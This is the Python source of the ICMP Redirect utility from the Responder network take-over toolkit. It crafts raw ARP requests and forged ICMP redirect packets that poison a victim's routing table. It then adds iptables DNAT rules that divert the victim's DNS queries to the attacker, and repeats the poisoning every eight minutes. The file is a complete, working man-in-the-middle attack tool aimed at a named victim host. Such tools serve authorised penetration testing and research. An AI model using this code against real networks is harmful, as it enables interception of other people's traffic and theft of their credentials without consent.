#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import socket
import struct
import optparse
import pipes
import sys
import codecs
from socket import *

sys.path.append("../")
from responder.src.odict import OrderedDict
from random import randrange
from time import sleep
from subprocess import call

if sys.version_info < (3, 0):
    sys.exit("This script is meant to be run with Python3")
parser = optparse.OptionParser(
    usage="python %prog -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1",
    prog=sys.argv[0],
)
parser.add_option(
    "-i",
    "--ip",
    action="store",
    help="The ip address to redirect the traffic to. (usually yours)",
    metavar="10.20.30.40",
    dest="OURIP",
)
parser.add_option(
    "-g",
    "--gateway",
    action="store",
    help="The ip address of the original gateway (issue the command 'route -n' to know where is the gateway",
    metavar="10.20.30.254",
    dest="OriginalGwAddr",
)
parser.add_option(
    "-t",
    "--target",
    action="store",
    help="The ip address of the target",
    metavar="10.20.30.48",
    dest="VictimIP",
)
parser.add_option(
    "-r",
    "--route",
    action="store",
    help="The ip address of the destination target, example: DNS server. Must be on another subnet.",
    metavar="10.20.40.1",
    dest="ToThisHost",
)
parser.add_option(
    "-s",
    "--secondaryroute",
    action="store",
    help="The ip address of the destination target, example: Secondary DNS server. Must be on another subnet.",
    metavar="10.20.40.1",
    dest="ToThisHost2",
)
parser.add_option(
    "-I",
    "--interface",
    action="store",
    help="Interface name to use, example: eth0",
    metavar="eth0",
    dest="Interface",
)
parser.add_option(
    "-a",
    "--alternate",
    action="store",
    help="The alternate gateway, set this option if you wish to redirect the victim traffic to another host than yours",
    metavar="10.20.30.40",
    dest="AlternateGwAddr",
)
options, args = parser.parse_args()

if options.OURIP is None:
    print("-i mandatory option is missing.\n")
    parser.print_help()
    exit(-1)
elif options.OriginalGwAddr is None:
    print(
        "-g mandatory option is missing, please provide the original gateway address.\n"
    )
    parser.print_help()
    exit(-1)
elif options.VictimIP is None:
    print("-t mandatory option is missing, please provide a target.\n")
    parser.print_help()
    exit(-1)
elif options.Interface is None:
    print("-I mandatory option is missing, please provide your network interface.\n")
    parser.print_help()
    exit(-1)
elif options.ToThisHost is None:
    print("-r mandatory option is missing, please provide a destination target.\n")
    parser.print_help()
    exit(-1)

if options.AlternateGwAddr is None:
    AlternateGwAddr = options.OURIP

# Setting some vars.
OURIP = options.OURIP
OriginalGwAddr = options.OriginalGwAddr
AlternateGwAddr = options.AlternateGwAddr
VictimIP = options.VictimIP
ToThisHost = options.ToThisHost
ToThisHost2 = options.ToThisHost2
Interface = options.Interface


def Show_Help(ExtraHelpData):
    print(
        "\nICMP Redirect Utility 0.1.\nCreated by Laurent Gaffie, please send bugs/comments to laurent.gaffie@gmail.com\n\nThis utility combined with Responder is useful when you're sitting on a Windows based network.\nMost Linux distributions discard by default ICMP Redirects.\n"
    )
    print(ExtraHelpData)


MoreHelp = (
    "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"
    % (ToThisHost, OURIP)
)

# Python version
if sys.version_info > (3, 0):
    PY2OR3 = "PY3"
else:
    PY2OR3 = "PY2"


def StructWithLenPython2or3(endian, data):
    # Python2...
    if PY2OR3 == "PY2":
        return struct.pack(endian, data)
    # Python3...
    else:
        return struct.pack(endian, data).decode("latin-1")


def NetworkSendBufferPython2or3(data):
    if PY2OR3 == "PY2":
        return str(data)
    else:
        return bytes(str(data), "latin-1")


def NetworkRecvBufferPython2or3(data):
    if PY2OR3 == "PY2":
        return str(data)
    else:
        return str(data.decode("latin-1"))


def GenCheckSum(data):
    s = 0
    for i in range(0, len(data), 2):
        q = ord(data[i]) + (ord(data[i + 1]) << 8)
        f = s + q
        s = (f & 0xFFFF) + (f >> 16)
    return StructWithLenPython2or3("<H", ~s & 0xFFFF)


class Packet:
    fields = OrderedDict(
        [
            ("data", ""),
        ]
    )

    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k, v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v

    def __str__(self):
        return "".join(map(str, self.fields.values()))


#####################################################################
# ARP Packets
#####################################################################
class EthARP(Packet):
    fields = OrderedDict(
        [
            ("DstMac", "\xff\xff\xff\xff\xff\xff"),
            ("SrcMac", ""),
            ("Type", "\x08\x06"),  # ARP
        ]
    )


class ARPWhoHas(Packet):
    fields = OrderedDict(
        [
            ("HwType", "\x00\x01"),
            ("ProtoType", "\x08\x00"),  # IP
            ("MacLen", "\x06"),
            ("IPLen", "\x04"),
            ("OpCode", "\x00\x01"),
            ("SenderMac", ""),
            ("SenderIP", "\x00\xff\x53\x4d"),
            ("DstMac", "\x00\x00\x00\x00\x00\x00"),
            ("DstIP", "\x00\x00\x00\x00"),
        ]
    )

    def calculate(self):
        self.fields["DstIP"] = inet_aton(self.fields["DstIP"]).decode("latin-1")
        self.fields["SenderIP"] = inet_aton(OURIP).decode("latin-1")


#####################################################################
# ICMP Redirect Packets
#####################################################################
class Eth2(Packet):
    fields = OrderedDict(
        [
            ("DstMac", ""),
            ("SrcMac", ""),
            ("Type", "\x08\x00"),  # IP
        ]
    )


class IPPacket(Packet):
    fields = OrderedDict(
        [
            ("VLen", "\x45"),
            ("DifField", "\x00"),
            ("Len", "\x00\x38"),
            ("TID", "\x25\x25"),
            ("Flag", "\x00"),
            ("FragOffset", "\x00"),
            ("TTL", "\x1d"),
            ("Cmd", "\x01"),  # ICMP
            ("CheckSum", "\x00\x00"),
            ("SrcIP", ""),
            ("DestIP", ""),
            ("Data", ""),
        ]
    )

    def calculate(self):
        self.fields["TID"] = chr(randrange(256)) + chr(randrange(256))
        self.fields["SrcIP"] = inet_aton(str(self.fields["SrcIP"])).decode("latin-1")
        self.fields["DestIP"] = inet_aton(str(self.fields["DestIP"])).decode("latin-1")
        # Calc Len First
        CalculateLen = (
            str(self.fields["VLen"])
            + str(self.fields["DifField"])
            + str(self.fields["Len"])
            + str(self.fields["TID"])
            + str(self.fields["Flag"])
            + str(self.fields["FragOffset"])
            + str(self.fields["TTL"])
            + str(self.fields["Cmd"])
            + str(self.fields["CheckSum"])
            + str(self.fields["SrcIP"])
            + str(self.fields["DestIP"])
            + str(self.fields["Data"])
        )
        self.fields["Len"] = StructWithLenPython2or3(">H", len(CalculateLen))
        # Then CheckSum this packet
        CheckSumCalc = (
            str(self.fields["VLen"])
            + str(self.fields["DifField"])
            + str(self.fields["Len"])
            + str(self.fields["TID"])
            + str(self.fields["Flag"])
            + str(self.fields["FragOffset"])
            + str(self.fields["TTL"])
            + str(self.fields["Cmd"])
            + str(self.fields["CheckSum"])
            + str(self.fields["SrcIP"])
            + str(self.fields["DestIP"])
        )
        self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)


class ICMPRedir(Packet):
    fields = OrderedDict(
        [
            ("Type", "\x05"),
            ("OpCode", "\x01"),
            ("CheckSum", "\x00\x00"),
            ("GwAddr", ""),
            ("Data", ""),
        ]
    )

    def calculate(self):
        self.fields["GwAddr"] = inet_aton(OURIP).decode("latin-1")
        CheckSumCalc = (
            str(self.fields["Type"])
            + str(self.fields["OpCode"])
            + str(self.fields["CheckSum"])
            + str(self.fields["GwAddr"])
            + str(self.fields["Data"])
        )
        self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)


class DummyUDP(Packet):
    fields = OrderedDict(
        [
            ("SrcPort", "\x00\x35"),  # port 53
            ("DstPort", "\x00\x35"),
            ("Len", "\x00\x08"),  # Always 8 in this case.
            ("CheckSum", "\x00\x00"),  # CheckSum disabled.
        ]
    )


def ReceiveArpFrame(DstAddr):
    s = socket(AF_PACKET, SOCK_RAW)
    s.settimeout(5)
    Protocol = 0x0806
    s.bind((Interface, Protocol))
    OurMac = s.getsockname()[4].decode("latin-1")
    Eth = EthARP(SrcMac=OurMac)
    Arp = ARPWhoHas(DstIP=DstAddr, SenderMac=OurMac)
    Arp.calculate()
    final = str(Eth) + str(Arp)
    try:
        s.send(NetworkSendBufferPython2or3(final))
        data = s.recv(1024)
        DstMac = data[22:28]
        DestMac = codecs.encode(DstMac, "hex")
        PrintMac = ":".join(
            [DestMac[x : x + 2].decode("latin-1") for x in range(0, len(DestMac), 2)]
        )
        return PrintMac, DstMac.decode("latin-1")
    except:
        print(
            "[ARP]%s took too long to Respond. Please provide a valid host.\n"
            % (DstAddr)
        )
        exit(1)


def IcmpRedirectSock(DestinationIP):
    PrintMac, DestMac = ReceiveArpFrame(VictimIP)
    print("[ARP]Target Mac address is :", PrintMac)
    PrintMac, RouterMac = ReceiveArpFrame(OriginalGwAddr)
    print("[ARP]Router Mac address is :", PrintMac)
    s = socket(AF_PACKET, SOCK_RAW)
    Protocol = 0x0800
    s.bind((Interface, Protocol))
    Eth = Eth2(DstMac=DestMac, SrcMac=RouterMac)
    IPPackUDP = IPPacket(
        Cmd="\x11",
        SrcIP=VictimIP,
        DestIP=DestinationIP,
        TTL="\x40",
        Data=str(DummyUDP()),
    )
    IPPackUDP.calculate()
    ICMPPack = ICMPRedir(GwAddr=AlternateGwAddr, Data=str(IPPackUDP))
    ICMPPack.calculate()
    IPPack = IPPacket(
        SrcIP=OriginalGwAddr, DestIP=VictimIP, TTL="\x40", Data=str(ICMPPack)
    )
    IPPack.calculate()
    final = str(Eth) + str(IPPack)
    s.send(NetworkSendBufferPython2or3(final))
    print(
        "\n[ICMP]%s should have been poisoned with a new route for target: %s.\n"
        % (VictimIP, DestinationIP)
    )


def FindWhatToDo(ToThisHost2):
    if ToThisHost2 != None:
        Show_Help("Hit CTRL-C to kill this script")
        RunThisInLoop(ToThisHost, ToThisHost2, OURIP)
    if ToThisHost2 == None:
        Show_Help(MoreHelp)
        IcmpRedirectSock(DestinationIP=ToThisHost)
        exit()


def RunThisInLoop(host, host2, ip):
    dns1 = pipes.quote(host)
    dns2 = pipes.quote(host2)
    ouripadd = pipes.quote(ip)
    call(
        "iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "
        + dns1
        + " --dport 53 -j DNAT --to-destination "
        + ouripadd
        + ":53",
        shell=True,
    )
    call(
        "iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "
        + dns2
        + " --dport 53 -j DNAT --to-destination "
        + ouripadd
        + ":53",
        shell=True,
    )
    print(
        "[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers."
    )
    while True:
        IcmpRedirectSock(DestinationIP=dns1)
        IcmpRedirectSock(DestinationIP=dns2)
        print("[+]Repoisoning the target in 8 minutes...")
        sleep(480)


FindWhatToDo(ToThisHost2)
